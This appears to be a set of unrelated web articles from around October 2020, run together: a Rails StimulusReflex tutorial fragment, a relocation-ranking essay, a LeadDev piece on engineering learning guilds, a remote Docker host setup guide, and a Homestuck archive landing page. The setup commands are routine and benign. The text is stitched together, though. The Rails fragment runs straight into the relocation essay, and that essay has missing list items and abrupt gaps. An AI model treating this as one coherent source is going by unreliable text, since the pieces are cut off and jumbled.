<div><pre><span></span><span>class</span> <span>CalendarEventsController</span> <span>&lt;</span> <span>ApplicationController</span>
  <span>include</span> <span>CableReady</span><span>::</span><span>Broadcaster</span>

  <span># ...</span>

  <span>def</span> <span>create</span>
    <span>@calendar_event</span> <span>=</span> <span>CalendarEvent</span><span>.</span><span>new</span><span>(</span><span>calendar_event_params</span><span>)</span>

    <span>if</span> <span>@calendar_event</span><span>.</span><span>save</span>
      <span>@calendar_events</span> <span>=</span> <span>CalendarEvent</span><span>.</span><span>where</span><span>(</span><span>occurs_at</span><span>:</span> <span>@date_range</span><span>)</span><span>.</span><span>order</span><span>(</span><span>:occurs_at</span><span>)</span><span>.</span><span>group_by</span><span>(</span><span>&amp;</span><span>:occurs_at_date</span><span>)</span>
      <span>cable_ready</span><span>[</span><span>"CalendarEvents"</span><span>].</span><span>morph</span><span>({</span>
        <span>selector</span><span>:</span> <span>"#calendar-grid"</span><span>,</span>
        <span>html</span><span>:</span> <span>CalendarEventsController</span><span>.</span><span>render</span><span>(</span><span>partial</span><span>:</span> <span>'calendar_events/calendar_grid'</span><span>,</span> <span>locals</span><span>:</span> <span>{</span><span>dates</span><span>:</span> <span>@dates</span><span>,</span> <span>calendar_events</span><span>:</span> <span>@calendar_events</span><span>}),</span>
        <span>children_only</span><span>:</span> <span>true</span><span>})</span>
      <span># -----&gt; we also have to reset the form &lt;-----</span>
      <span>cable_ready</span><span>[</span><span>"CalendarEvents"</span><span>].</span><span>inner_html</span><span>({</span>
        <span>selector</span><span>:</span> <span>"#calendar-form"</span><span>,</span>
        <span>html</span><span>:</span> <span>CalendarEventsController</span><span>.</span><span>render</span><span>(</span><span>partial</span><span>:</span> <span>"form"</span><span>,</span> <span>locals</span><span>:</span> <span>{</span> <span>calendar_event</span><span>:</span> <span>CalendarEvent</span><span>.</span><span>new</span> <span>})})</span>

      <span>cable_ready</span><span>.</span><span>broadcast</span>
    <span>else</span>
      <span>render</span> <span>:index</span>
    <span>end</span>
  <span>end</span>

  <span># ...</span>

<span>end</span>
</pre></div>
<p>Note that I’m deliberately using the <code>inner_html</code> operation here, since <code>morph</code> would not actually clear the inputs, since their current state is not reflected in the DOM.</p>
<p><img src="https://blog.minthesize.com/assets/images/posts/2020/2020-10-16-calendula-02.gif" alt="../assets/images/posts/2020/2020-10-16-calendula-02.gif"></p>
<p>The added benefit of this approach over a pure StimulusReflex based one is that we can update our model(s) on other parts of the site, too. If we isolate that logic in an <code>ActiveJob</code> (or a service object, for those so inclined), we can make it more testable and reuse it from other parts of the application.</p>

<p>We’ll revisit this <code>ActiveJob</code> in part 2.</p>
<h2>2. Use a Concern to DRY your StimulusReflex Form Submissions</h2>
<p>Pure reflex-based form submissions can be a source of <b>Shotgun Surgery</b> smells if you pay no attention, since you’ll end up with a lot of duplicated logic. True, standard Rails controllers are resource-based too, but creating a <code>resource.rb</code>, <code>resources_controller.rb</code>, <code>resources_reflex.rb</code> structure will lead you down the path of unmaintainability quickly. Let’s revisit the example from above and put the form handling logic in a reflex.</p>
<h3>Re-Using the Pattern</h3>
<p>So what’s the point in this exercise if I didn’t demonstrate how this pattern can be reused? For this, let’s assume we want to include national holidays in our calendar (I’m using the <a href="https://github.com/holidays/holidays">holidays</a> and <a href="https://github.com/stefanpenner/country_select">country_select</a> gems here). First, we need a model to store this data. We’ll use a standard ActiveRecord and use it in a “singleton” fashion (meaning, we pretend there’s only ever one instance of it).</p>
<div><pre><span></span>bin/rails g model Settings holiday_region:string
</pre></div>
<p>We’d like to add a simple dropdown to choose a country from, so we just add</p>
<div><pre><span></span><span>&lt;div class="grid grid-cols-2 w-full"&gt;</span>
<span>  &lt;div id="calendar-form" data-controller="reflex-form" data-reflex-form-reflex-name="CalendarEventsReflex"&gt;</span>
<span>    </span><span>&lt;%=</span> <span>render</span> <span>"form"</span><span>,</span> <span>calendar_event</span><span>:</span> <span>@calendar_event</span> <span>%&gt;</span><span></span>
<span>  &lt;/div&gt;</span>
<span>  &lt;div id="settings-form" data-controller="reflex-form" data-reflex-form-reflex-name="SettingsReflex"&gt;</span>
<span>    </span><span>&lt;%=</span> <span>form_with</span><span>(</span><span>model</span><span>:</span> <span>Setting</span><span>.</span><span>first</span><span>,</span> <span>method</span><span>:</span> <span>:put</span><span>,</span> <span>url</span><span>:</span> <span>"#"</span><span>,</span> <span>class</span><span>:</span> <span>"m-8"</span><span>,</span> <span>data</span><span>:</span> <span>{</span><span>signed_id</span><span>:</span> <span>Setting</span><span>.</span><span>first</span><span>.</span><span>to_sgid</span><span>.</span><span>to_s</span><span>,</span> <span>target</span><span>:</span> <span>"reflex-form.form"</span><span>})</span> <span>do</span> <span>|</span><span>form</span><span>|</span> <span>%&gt;</span><span></span>

<span>    </span><span>&lt;%</span> <span>end</span> <span>%&gt;</span><span></span>
<span>  &lt;/div&gt;</span>
<span>&lt;/div&gt;</span>
</pre></div>
<p>to our <code>calendar_events/index.html.erb</code>. Note that we use the same stimulus controller we created above! We are passing in a signed global ID (SGID) of our <code>Settings</code> instance, too. We need to extend our <code>Submittable</code> concern to check whether a signed …</p></div></div>

The whole world is at your feet, but "the whole world" is not a specific place where you can be. You have to choose, if not a city, at least a country. Nowadays, there are plenty of places where your career can skyrocket, and you can have a great quality of life. Of course, it depends on your definition of the "quality of life". In this article, we will try to set subjective factors that drive your decision aside. We will look at the numbers in different areas to rate and, later on, filter our potential relocation prospects for the next X years.</p>

<h2 id="criteria">Criteria</h2>
<p>Before we do the measurement itself, we need to know what to measure. So what do we expect from our new home?</p>
<ol>
<li>Freedom! Freedom of speech, freedom of political and religious views, functional democratic institutes.</li>
<li>No corruption... Ok, let's leave ponies and unicorns in our hopefully happy childhood memories. As little corruption as possible. I would like to see where my taxes go.</li>
<li>Powerful economy. Free market, relaxed regulations, highly diversified high-tech economy. Living off oil and gas is not a good long-term vision.</li>
<li>Wealth, comfort, safety. As software engineers, we can make decent money at any point of the globe. However, our well-being is not everything. Well-being of our neighbors, who are not software engineers, matters as well. Let's just suppose that when the basic needs are satisfied, human beings tend to get creative, self-improve, create new breakthrough companies, and, therefore, lead the nation to new highs. I am not a socialist in any way. I am just saying that your new Tesla might not make you half as happy if dozens of people next to you barely make enough money for food and clothes.</li>
<li>Soft immigration policy. Permanent residence in X years. Passport in X + Y years. Work permit for your spouse. </li>
<li>Moderate taxes. Who wants to pay more, right?</li>
<li>Hot IT job market. Yes, there are plenty of remote opportunities, but, most probably, you will need a local job to get that work visa.</li>
<li>Science. Well-developed and well-sponsored science. Let's just suppose it will lead to more innovation in the technological sector of the economy. Moreover, I, personally, would love to believe that at some point in my life I will do research. After all, I might get tired of making my React application draw just another form to save just another JSON with user data to the database.</li>
<li>Strong army. "People who do not want to feed their own army will soon be forced to feed someone else's." That is, allegedly, Mr. Napoleon Bonaparte, not me.</li>
<li>Immigrant integration and language. Ideally, people should care not where you come from, but what human being are you. Ideally, they should speak English. I can barely come up with a 10-word sentence without 10 mistakes in it, please, do not make me learn another language!</li>
<li>Strong passport that allows as many visa-free entries to different countries as possible.</li>
</ol>
<h2 id="approach">Approach</h2>
<p>To be at least relatively object we will not base our judgment on beautiful or not so beautiful stories and videos of various bloggers, vloggers, and who-knows-what-loggers. Instead, I suggest using indices by, in most cases, non-profit independent organizations.</p>

<li>Immigration policy<ol>
<li>There are some indices trying to somehow rate the migration by people inflow and outflow, but it is not what we are after. We need to rate based on the following criteria:<ol>
<li>Requirements for immigration visa.</li>
<li>Requirements for permanent residence.</li>
<li>Work permit for spouse.</li>
<li>Requirements for naturalization.</li>
<li>Multiple citizenship, i.e. if we need to give up an existing passport to be naturalized.
Since there is no easy way to assess these factors, we will, first, filter the countries by other indices, and then have a detailed look at the immigration policy of the finalists.</li>

<p>Here we face the first evidence that humans can never stay 100% objective. I've heard so much nice stuff about Singapore, so I decided to let it pass trough to see how it performs by other criteria.</p>

<p>Look at that! My bet on Singapore paid off!
I love simplicity, so I would like to take <code>0.9</code> as the bottom line. One thing stopping me is that Microsoft has an office in Prague. I do not want to discard a chance to work there just because the number was slightly lower than I wanted. So let's take <code>0.891</code> as the bottom line to let Czech Republic pass to the next stage.</p>
<p>We are now left with:</p>
<ul>
<li>Norway</li>
<li>Switzerland</li>
<li>Ireland</li>
<li>Germany</li>
<li>Iceland</li>
<li>Sweden</li>

<h2 id="filter-by-population">Filter by population</h2>
<p>Luxembourg and Iceland show great results so far. Population there is <code>0.62</code> and <code>0.35</code> millions of people respectfully. I reckon these countries might easily be by-invitation-only clubs that do not welcome new members. To make filtering a bit easier, let's assume that we will only consider countries with 5 million of people and greater. Time to say goodbye to Luxembourg, Iceland, Slovenia, and New Zealand.</p>
<p>Here is what is left:</p>

October 26, 2020 | https://leaddev.com/continuous-learning/how-build-your-learning-culture | <a href="https://web.archive.org/web/*/https://leaddev.com/continuous-learning/how-build-your-learning-culture">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>At Teachers Pay Teachers, we’ve been experimenting with a novel social learning format for the past two years. In this article, I discuss the motivations, design, and results of our experiment: reserving 10% of engineering time for personal growth.</p><div>
<div>
<div> <h2>Why does learning matter?</h2>
<p>We learn to keep up with an evolving world that’s changing quicker than ever. Consider the mobile landscape: iOS and Android didn’t exist 15 years ago, and a rich mobile experience felt exotic. Just ten years ago, releasing software monthly was considered moving fast; continuous delivery was considered a bleeding-edge approach reserved for only the boldest engineering teams. Around seven years ago, Oculus was virtually unknown and mainstream VR was a pipedream. That’s not to mention the rise of social media, emerging markets on the Internet, and the evolution of digital privacy and security.</p>
<p>There’s an acronym that succinctly describes the world we’re living in: VUCA</p>
<ul><li>Volatility – the world is constantly evolving;</li>
<li>Unpredictability – it’s challenging to predict with any degree of certainty what the next several months will look like;</li>
<li>Complexity – the world has many interconnected parts and variables, which make it difficult to understand and analyze;</li>
<li>Ambiguity – it’s tough to grasp the bigger picture and put much of what we’re observing in context.</li>
</ul><p>VUCA affects employees uniquely. If you consider agriculture, excelling is primarily a matter of owning land that you can use to produce goods. For manufacturing, you focus on acquiring capital that you can use to produce goods. Knowledge work on the other hand is about acquiring information that you can use to produce goods and services.&nbsp;</p>
<p>As technology advances, the value of agriculture and manufacturing skills tend to decay more slowly. For employees, every time there’s a new tool, platform, or even social norm we must revisit our assumptions and potentially rethink everything. For example, in 2011, 28.5% of websites relied on Adobe’s Flash Player and less than ten years later, that figure has fallen to less than 3%. Most Flash developers had to acquire an entirely new skillset in that time to stay relevant. As another example, in 2019 alone, demand for engineers familiar with blockchain rose 517% according to Hired.com’s <a href="https://hired.com/state-of-software-engineers">2020 State of Software Engineers</a> report. If you have a few years of blockchain experience, that puts you in the 99th percentile.</p>
<p>As companies evolve continuously to keep up with the pace of innovation, employees must learn continuously as their teams adopt new strategies, technologies, and best practices. In a VUCA world, teams that learn well, perform well.</p>
<h2>What makes learning at work challenging?</h2>
<p>Beyond learning to keep up with a changing world, it’s been demonstrated that learning is a great use of time.&nbsp;</p>
<p>The 2019 Edition of <a href="https://learning.linkedin.com/resources/workplace-learning-report-2019">LinkedIn’s Workplace Learning Report</a> compared heavy learners (people who spend 5+ hours per week learning) to light learners (people who spend fewer than one hour per week). LinkedIn Learning reports that heavy learners are 47% less likely to be stressed at work, 48% more likely to have found a sense of purpose in their work, and 74% more likely to know where they want to go in their career. Despite the benefits of learning, people typically struggle to make time for learning at work. In the same report, LinkedIn Learning found that 74% of people want to learn using spare time at work and 94% of respondents would stay at a company longer if it invested in their career. Despite this, the number one reason employees feel held back from developing is due to a lack of time to focus on growth.</p>
<p>Meanwhile, two-thirds of companies struggle to engage their employees in learning programs despite consistent increases in L&amp;D spend globally as companies attempt to close skill gaps. As a result, a whopping 75% of employees invest in their own work-related learning. Furthermore, employees spend up to 5x more time on self-directed learning than employer-sponsored learning.</p>
<p>It’s been demonstrated that learning is a good use of time and companies are investing hundreds of billions in professional development every year. But the vast majority of professional learning continues to be self-directed. What’s the disconnect?</p>
<h2>Learning communities</h2>
<p>A learning community is a group of people who share similar learning goals. Companies tend to emphasize solo learning experiences, which may be a contributing factor to the above trends; 87% of employees say sharing knowledge is a critical part of the learning experience yet only 34% of companies are investing in social learning. It seems like there’s a big missed opportunity here. Could adding a social element to learning help increase employee engagement with L&amp;D programs?</p>
<p>We can look to the DevOps Research and Assessment (DORA) team for a clue about the value of social learning. They’ve conducted the single largest study of DevOps best practices in history, with more than 31,000 survey responses collected over the last several years. One of their goals is to identify the practices that separate elite performers from the rest of the pack. Their conclusions are based on data rather than conjecture, and anecdotal evidence. Their research is so good, they were acquired by Google in 2018.</p>
<p>DORA’s <a href="https://services.google.com/fh/files/misc/state-of-devops-2019.pdf">2019 State of DevOps Report</a> concludes that:</p>
<p>‘High performers favor strategies that create community structures at both low and high levels in the organization, likely making them more sustainable and resilient to reorgs and product changes. The top two strategies employed are Communities of Practice and Grassroots.’</p>
<p>They define Communities of Practice (CoP) as:</p>
<p>‘Groups that share common interests in tooling, language, or methodologies are fostered within an organization to share knowledge and expertise with each other, across teams, and around the organization.’</p>
<p>The term ‘Communities of Practice’ was coined by Jean Lave, a cognitive anthropologist, and Étienne Wenger, a computer science Ph.D., and educational theorist. They were studying the apprenticeship models across various cultures, spaces, and times including Liberian tailors perfecting their craft; Yucatec Mayam Midwives learning prenatal care; and U.S. Navy Quartermasters learning how to navigate. They noted many groups relying on informal community structures for training and decided to call these self-organizing, knowledge-sharing groups ‘Communities of Practice’.</p>
<p>The following four factors distinguish a Community of Practice from other types of groups:</p>
<ul><li><strong>Purpose.</strong> The primary purpose is personal growth and building expertise.</li>
<li><strong>Membership</strong>. Members self-select based on interest or personal goals.</li>
<li><strong>Cohesive</strong> <strong>force</strong>. Shared passion and commitment of the group’s members.</li>
<li><strong>Duration</strong>. CoPs last as long as there’s interest.</li>
</ul><p>Consider the differences between CoPs and professional networks, which may appear similar at first glance. Professional networks exist primarily for the exchange of business information; include friends and business acquaintances; are held together by mutual needs; and exist as long as people have a reason to connect.</p>
<p>You likely already have Communities of Practice at your company. Why is it so important to study, understand, and nurture these communities? To maximize the impact of your CoPs, you need to find ways to connect them effectively to broader business activities.</p>
<p>'Although communities of practice are fundamentally informal and self-organizing, they benefit from cultivation. Like gardens, they respond to attention that respects their nature. You can’t tug on a cornstalk to make it grow faster or taller, and you shouldn’t yank a marigold out of the ground to see if it has roots. You can, however, till the soil, pull out weeds, add water during dry spells, and ensure that your plants have the proper nutrients.'</p>
<p>- Étienne Wenger, <a href="https://hbr.org/2000/01/communities-of-practice-the-organizational-frontier">Communities of Practice: The Organizational Frontier</a></p>
<h2>CoPs in practice</h2>
<p>At Teachers Pay Teachers, we recognized many of the pain points of employer-sponsored professional development within the engineering team. We had varied and nuanced learning needs with many going unmet; we offered a learning stipend that was frequently unused; engineers on the team started groups resembling CoPs, but they typically had low engagement; and internal experts were struggling to scale their knowledge.&nbsp;</p>
<p>Two years ago we began experimenting with reserving 10% of engineering time for personal growth and introduced two types of CoPs for structured social learning.</p>
<p>The first kind of CoP we introduced was the Learning Guild, consisting of a group of engineers with shared interests. They’re focused on <em>learning priorities</em> set by the engineering management team. To set learning priorities, we, as engineering management, reflect on the <em>gaps and weaknesses</em> we want to turn into <em>strengths and core competencies</em>. That includes hiring needs, shifts in our technical strategy, product performance, and various feedback channels such as engagement surveys.&nbsp;</p>
<p>The guilds pursue their learning goals using 2-3 week sprints. Each sprint consists of reading assignments and practice exercises to help members learn more deeply. At the conclusion of each sprint, the guild has a meeting consisting of a presentation by a member of the group followed by an open discussion.&nbsp;</p>
<p>This format has worked incredibly well for us with our most successful guilds seeing 100% retention; high scores for self-perceived learning; and a 97% speaker preparedness rating, which is a metric we use to ensure presenters are leading high-quality guild discussions. Ultimately, we’ve built a healthy iterative loop around learning that’s directly connected to the broader needs of our company.</p>

<p>The second kind of CoP is the Project Guild, which is how we structure self-directed learning. Project guilds consist of small group projects chosen by the group themselves. The primary requirement is that projects are connected to Teachers Pay Teachers in some way. Teams use Friday afternoons to make progress and frequently demo their work …</p></div></div></div></div>

            <p>Monday, 26 October 2020.</p>

            <p><img src="https://s3-eu-west-1.amazonaws.com/eu-west-1.beatletech.com/images/docker_logo.png" alt="Docker" width="30%" title="Docker"></p>

<h3 id="tldr"><strong>TL;DR</strong></h3>

<ul>
  <li>Running Docker on macOS results in noisy CPU fans and low performance (build times)</li>
  <li>Apple Silicon probably not the answer</li>
  <li>The solution is using remote Linux Docker host (with <a href="#1-install-docker-engine-on-remote-host">setup</a> instructions)</li>
</ul>

<h3 id="noisy-cpu-fans">Noisy CPU fans</h3>

<p>As a developer I’m a big fan of Apple hardware and software ever since I got my first Macbook back in 2008. MacOS is a UNIX operating system running on X86 hardware (changing to ARM soon, but more on that later) that makes developing for Linux production servers a smooth experience utilizing the same UNIX tooling. While my development stack changed over the years and nowadays includes Docker, Kubernetes and <a href="https://bedrock.io/">bedrock.io</a>, macOS still continues to serve me well. It is providing these new CLI tools and templates on a stable OS with little to no issues, a nice UI with great HIDPI scaling (rocking a LG 5K monitor over <a href="https://beatletech.com/setup">here</a>), and of course I’ve become so used to the interface that switching back to Windows or Linux Desktop would mess up my optimized workflows and habits.</p>

<p>One thing, however, that could use improvements is Docker Desktop (<a href="https://docs.docker.com/docker-for-mac/">for mac</a>), to increase Docker container performance, speed up docker build times and reduce CPU usage when running “idle”. The reason for being slow and performance hungry is succinctly explained in <a href="https://stackoverflow.com/questions/55951014/docker-in-macos-is-very-slow">this</a> Stackoverflow answer:</p>

<blockquote>
  <p>Docker needs a plain Linux kernel to run. Unfortunately, Mac OS and Windows cannot provide this. Therefore, there is a client on Mac OS to run Docker. In addition to this, there is an abstraction layer between Mac OS kernel and applications (Docker containers) and the filesystems are not the same.</p>
</blockquote>

<p>In other words, there is a lot of extra (hyper)virtualization and filesystem overhead going on. Of course a relative performance hit (compared to running on Linux directly) is something I could live with, but my main annoyance presents itself loudly when I’m building (and deploying) a lot of Docker images: it spins up my Macbook pro CPU fans to audible levels, something in stark contrast to the absolute silence at which my laptop runs almost everything else (I guess I’m spoiled).</p>

<p>While you could argue that you should not build and push Docker images to staging or production from your local development machine and just incorporate it in your CI/CD pipeline, I prefer having this manual control, which is also nicely supported by the <a href="https://bedrock.io/">bedrock.io</a> build and deploy commands. This point probably warrants a whole dedicated blog post, but if you are like me, and also run a lot of docker build commands locally, then you will be interested in the solution I found to my <strong>main problem: the lack of macOS docker performance (long build times) and noisy CPU fans</strong>.</p>

<h3 id="apple-silicon-is-not-the-solution">Apple Silicon is not the solution</h3>

<p>With myself being an Apple enthusiast, you can image why I’m excited about the upcoming transition from Intel CPUs to Apple Silicon, which is planned to make its debut in their Macbook Pro and iMac lineup later this year (<a href="https://9to5mac.com/2020/10/09/apple-silicon-november-bloomberg/">Rumors</a> point to a November event). So at first I thought that the answer to the lackluster Docker performance on the Mac would simply be waiting for the new ARM hardware release and buying a new Macbook Pro. However, this might not hold true as Apple Silicon will be an ARM SoC, which is a different architecture than X86_64. And X86_64 is still my deployment target for the foreseeable future. In other words, I still need to build X86_64 images and this will require emulation and virtualization that <a href="http://www.ml-illustrated.com/2020/06/25/ARM-Macs-virtualization-different-take.html">some</a> are expecting to have a 2x to 5x performance hit.</p>

<p>It is also worth noting that Craig Federighi, Apple’s senior vice president of Software Engineering, said the following during an interview after the initial WWDC Apple Silicon announcement:</p>

<blockquote>
  <p>“Virtualization on the new Macs won’t support X86 at all” (<a href="https://www.jeffgeerling.com/blog/2020/what-does-apple-silicon-mean-raspberry-pi-and-arm64">source</a>)</p>
</blockquote>

<p>Craig even explicitly called out Docker containers being built for ARM, and being able to run them on ARM instances in AWS, but what about building your X86 images? I know you can build for multi-arch including ARM now with docker desktop (<a href="https://www.docker.com/blog/multi-arch-images/">post</a>), but what will the performance hit be for Apple Silicon?</p>

<p>All in all, upcoming Apple Silicon doesn’t seem like an immediate win for my specific problem with Docker performance. Also, I like to skip 1st gen hardware and wait on the sidelines a bit longer before I migrate my production workflows to new hardware running on ARM.</p>

<p>Luckily I did find a solution that serves me right away and might also help with the transition to Apple Silicon in the future. <strong>Docker remote to the rescue!</strong></p>

<h3 id="remote-docker-host-solution">Remote Docker host Solution</h3>

<p>Instead of beefing up my local development machine now or with upcoming Apple ARM hardware, I looked into off-loading all the Docker activities onto a remote machine, and as it turns out, it is trivially easy to setup access to a remote docker host. I kinda knew about this, back when I was using Docker Swarm and connecting to different machines, but I somehow never thought about this as a setup for my “local” docker environment.</p>

<p>Needless to say, but one does not setup remote access without a remote machine, so I’m assuming you have a remote Linux machine running somewhere. I personally use and recommend dedicated or cloud servers from <a href="https://www.hetzner.com/">Hetzner</a>, that is if you are located in Europe. I’m using the <a href="https://www.hetzner.com/dedicated-rootserver/ax51-nvme">AX51-NVMe</a> Dedicated Root Server (Ryzen 7 3700X CPU, 64GB RAM, 1TB NVMe SSD), which seems comically cheap at only 59 Euros a month. Anyway, let’s get rolling.</p>

<h4 id="1-install-docker-engine-on-remote-host">1. Install Docker Engine on remote host</h4>
<p>First, let’s install Docker on your remote Linux server (I’m using the <a href="https://docs.docker.com/engine/install/ubuntu/">Ubunty install instructions</a>, but you can find instructions for other distros on that page as well):</p>

<figure><pre><code data-lang="bash"> <span>## Update the apt package index and install packages to allow apt to use a repository over HTTPS:</span>
 <span>$ </span><span>sudo </span>apt-get update

 <span>$ </span><span>sudo </span>apt-get <span>install</span> <span>\</span>
     apt-transport-https <span>\</span>
     ca-certificates <span>\</span>
     curl <span>\</span>
     gnupg-agent <span>\</span>
     software-properties-common

 <span>## Add Docker’s official GPG key:</span>
 <span>$ </span>curl <span>-fsSL</span> https://download.docker.com/linux/ubuntu/gpg | <span>sudo </span>apt-key add -

 <span>## Use the following command to set up the stable repository</span>
 <span>$ </span><span>sudo </span>add-apt-repository <span>\</span>
    <span>"deb [arch=amd64] https://download.docker.com/linux/ubuntu </span><span>\</span><span>
    </span><span>$(</span>lsb_release <span>-cs</span><span>)</span><span> </span><span>\</span><span>
    stable"</span>

 <span>## Install docker engine</span>
 <span>$ </span><span>sudo </span>apt-get update
 <span>$ </span><span>sudo </span>apt-get <span>install </span>docker-ce docker-ce-cli containerd.io</code></pre></figure>

<h4 id="2-create-docker-context">2. Create Docker Context</h4>

<p>Next up we need to access the remote Docker host and make it our default “local” engine. For this we leverage <strong>Docker Contexts</strong> in the following way. First we create a context that will hold the connection path (e.g. <code>ssh://coen@whatever.com</code>) to the remote docker host:</p>

<figure><pre><code data-lang="bash"> <span>$ </span>docker context create remote <span>--docker</span> <span>host</span><span>=</span>ssh://coen@whatever.com
 remote
 Successfully created context “remote”

 <span>$ </span>docker context <span>ls
 </span>NAME       TYPE    DESCRIPTION              DOCKER ENDPOINT    KUBERNETES ENDPOINT    ORCHESTRATOR
 default <span>*</span>  moby    Current DOCKER_HOST...   unix:///var/run/docker.sock               swarm
 remote     moby                             ssh://coen@whatever.com</code></pre></figure>

<p>And the final step is to make <code>remote</code> your default context:</p>

<figure><pre><code data-lang="bash"> <span>$ </span>docker context use remote
 remote
 Current context is now “remote”</code></pre></figure>

<h4 id="3-using-your-remote-docker-host">3. Using your remote Docker host</h4>

<p>With the previous 2 steps you are ready to start enjoying a <strong>silent</strong> local development machine when you are building docker images with an increased speed in build time! Any time you now run <code>docker build</code>, all the relevant (and changed) files that are required for the build are copied from your local computer to the remote Docker host in the background, and the <code>docker build</code> starts the build of the image on the remote host. The resulting image is also located on the remote host, which you can list with <code>docker images</code>, as all docker commands use the default <code>remote</code> context.</p>

<h3 id="benefits">Benefits</h3>

<p>To show you an example of Docker build speed improvements, let’s have a look at the following time measurements for building the <code>web</code> service component, a React SPA build with Webpack, of <a href="https://github.com/bedrockio/bedrock-core/tree/master/services/web">bedrock</a> on a clean build:</p>

<figure><pre><code data-lang="bash">  +---------+-------------------+--------------------+------------+---------------+
  | Context | Yarn <span>install time</span> | Webpack build <span>time</span> | Total <span>time</span> | Relative <span>time</span> |
  +---------+-------------------+--------------------+------------+---------------+
  | Local   | 75.82s            | 82.05s             | 157.87s    | 296% <span>(</span>~3x<span>)</span>    |
  +---------+-------------------+--------------------+------------+---------------+
  | Remote  | 18.19s            | 35.11s             |  53.30s    | 100% <span>(</span>1x<span>)</span>     |
  +---------+-------------------+--------------------+------------+---------------+</code></pre></figure>

<p>Of course a 3x improvement doesn’t come as a surprise when you are basically comparing a Macbook Pro with 2 (virtual) CPUs allocated to Docker, versus an 8 core dedicated Linux machine (with hyperthreading and higher internet bandwidth) even though not everything runs multi-threaded. But it is a big improvement that you can quickly and easily get for yourself and reap the benefits, which quickly adds up over time. Not to mention the complete silence at which you gain the faster build times.</p>

<p>As a bonus, you can now stop running Docker Desktop entirely, and no longer see a Docker process “idling” in the background that would otherwise still be using around 20% CPU all the time (doing nothing).</p>

<p>Being able to build X86_64 images on a remote machine, incidentally also makes it more viable to migrate my development environment to Apple Silicon in the future, not depending on Apple ARM to build and run my X86_64 images.</p>

<p>Finally, of course you can also <code>docker run</code> containers on your remote host. For example running MongoDB:</p>

<figure><pre><code data-lang="bash"> <span>$ </span>docker run <span>--name</span> mongo <span>-d</span> <span>-p</span> 27017:27017 <span>-v</span> /root/data:/data/db mongo:4.2.8
 <span># Note: /root/data is located on your remote machine</span></code></pre></figure>

<p>In order to access and use the running MongoDB container locally, make sure to SSH tunnel to your remote machine and forward the relevant ports. For this you can update your SSH config file: <code>.ssh/config</code>:</p>

<figure><pre><code data-lang="bash"><table><tbody><tr><td><pre>1
2
3
4
5
6
7
</pre></td><td><pre>Host coentunnel
  HostName …</pre></td></tr></tbody></table></code></pre></figure></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="introCard">
    <p><img src="https://bambosh.github.io/unofficial-homestuck-collection/images/collection_logo.png">
    </p>
    <div>
      <p><a href="https://twitter.com/Bamboshu" target="_blank"><i></i> Visit me on Twitter!</a></p>
      <p><a href="#download"><i></i> Skip to the download</a></p>
      
      <p>Let me tell you a story about a webcomic called <em>Homestuck</em>. The fourth in a series of “MS Paint Adventures” authored by Andrew Hussie from 2006 to 2016, it became wildly successful, in part because of its eclectic use of web technology like Adobe Flash and GIF animations.</p>

      <p>However, with Flash finally being phased out at the end of 2020, <em>Homestuck</em> is in a precarious state. While there have been official attempts to preserve aspects of the original experience by <a href="https://www.homestuck.com/" target="_blank">VIZ Media</a> (who have published <em>Homestuck</em> since 2018), the results have been mixed. With extra content scattered around the web in various states of decay, a solution was needed to preserve <em>Homestuck's</em> one-of-a-kind presentation and flair, for both returning readers and those new to the story.</p>
    </div>
  </div><div>
    <div>   

      <h2>YOUR WORST ADDICTION, NOW SAFE ON YOUR DESKTOP</h2>
      <p><em>The Unofficial Homestuck Collection</em> is a heavily customised browser, built from the ground up to support <em>Homestuck</em> and its related works. Flashes? We got 'em. The collection runs Flash content natively, providing the most authentic Homestuck experience possible.</p>
      <p>Don't get it twisted though, because "browser" in this context doesn't mean "online". <em>The Unofficial Homestuck Collection</em> is completely self contained, and <em>never</em> has to connect to the internet once you have it downloaded. </p>

      <h2>A ONE-STOP SHOP</h2>
      <p>Don't think we'd be content stopping at just <em>Homestuck</em>. The collection contains the other MS Paint Adventures, official <em>Homestuck</em> side-stories, and a garguantuan array of goodies for the enquiring reader. <a href="#faq2">Seriously, there is SO MUCH CONTENT in this thing.</a> It's totally ridiculous.</p> 

      <h2>NEW READER? NO PROBLEM.</h2>
      <p>Always wanted to try Homestuck? Overwhelmed by all the side-stories and sequels, and frustrated by the late-arrival spoilers plastered all over the internet? We've got your back. From the very beginning, <em>The Unofficial Homestuck Collection</em> has been designed to work as a safe way for new readers to get their teeth into the <em>Homestuck</em> universe. If you so choose, all future content will be carefully gated off until your progress in <em>Homestuck</em> makes it safe to view.</p>
    </div>
  </div><div>
    <div>
      <h2>THIS IS WHAT THE REFRANCE</h2>
      <p><em>The Unofficial Homestuck Collection</em> contains a complete database of the <em>Homestuck</em> Bandcamp, up to the most recent album as of <em>10/25/2020</em>. Want to know more about the crazy song you just heard in that Flash animation? Follow the link and see what's up! If you so choose, you can even enable an inline media player that legally streams the music directly from the source. You can try not to get lost exploring the twisted web of Homestuck's discography, but it's inevitable.</p>

      <h2>ENHANCED IN WAYS YOU CAN'T EVEN IMAGINE</h2>
      <p>We've got complete control over the browser, so you'd better believe we're taking advantage of it. Mid 2000's quality bitcrushed Flash audio? Nah, man. Almost every single flash in Homestuck has been painstakingly reworked with the highest quality music available. <a href="https://bambosh.github.io/unofficial-homestuck-collection/images/Untitled-60.jpg">You have to hear it to believe it.</a> Want to use themes on every page? Go nuts, I'm not the boss of you. Arrow key navigation? Automatically opening pesterlogs? You got it. Want absolutely none of the above? That's also an option! It's Homestuck, the way <em>you</em> want it.</p>
    </div>
  </div><div>
  <div>
   <h2>FAQ</h2>

      <h3>So you just... download it? That's it?</h3>
      <p>That's right! Well, almost. You probably saw above, but <em>The Unofficial Homestuck Collection</em> is actually split into two downloads: the desktop application itself, and the Asset Pack. In order to get it running, you need to pair the application with the asset pack the first time you start it up. The first thing you see will be <a href="https://bambosh.github.io/unofficial-homestuck-collection/images/setup.png">a screen like this, with a "Locate Assets" button down the bottom.</a> Once you have the Asset Pack downloaded, extract it anywhere you want. Even an external hard drive will work! Then hit the "Locate Assets" button, and select the extracted folder. The program will automatically restart, and bring you into the main browser!</p>

      <p>With all that said, <a href="https://github.com/Bambosh/unofficial-homestuck-collection" target="_blank">the application is completely open source, and you can play around the repository as much as you want over here.</a> It's all GPL-3.0, so fork it, request features, do whatever!</p>
      <br>

      <h3 id="faq2">Okay, so what's actually in it?</h3>
      <p>That's an extremely good question. The issue with this is that it's so damn large I can't even remember everything inside off the top of my head. Here's a by-no-means exhaustive list:</p>

